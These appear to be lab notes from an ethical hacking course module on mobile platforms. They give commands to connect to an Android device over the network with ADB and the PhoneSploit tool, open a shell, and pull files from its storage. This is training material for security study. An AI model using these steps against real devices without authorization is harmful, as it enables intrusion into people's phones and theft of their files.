# 17 - Hacking Mobile

## **Module 17 - Hacking Mobile Platforms**

###

###

### Download a file from Android using ADB Tool

```bash
adb devices -l

# Connection Establish Steps
adb connect 192.168.0.4:5555
adb devices -l
adb shell  

# Download a File from Android using ADB tool
adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
adb pull sdcard/log.txt /home/mmurphy/Desktop
```

### Download a file from Android using PhoneSploit

```bash
git clone https://github.com/aerosol-can/PhoneSploit
cd PhoneSploit
pip3 install colorama
#OR
python3 -m pip install colorama

python3 phonesploit.py

# Type 3 and Press Enter to Connect a new Phone OR Enter IP of Android Device
# Type 4, to Access Shell on phone

pwd
ls
cd sdcard
ls
cd Download

#Download File using PhoneSploit
9. Pull Folders from Phone to PC

#Enter the Full Path of file to Download
sdcard/Download/secret.txt
```









### **Exploit the Android Platform through ADB using PhoneSploit**

* cd Phonesploit
* python3 -m pip install colorama
* python3 phonesploit.py
* 3
* 10.10.10.14
* 4
* pwd
* cd sdcard
* cd Download
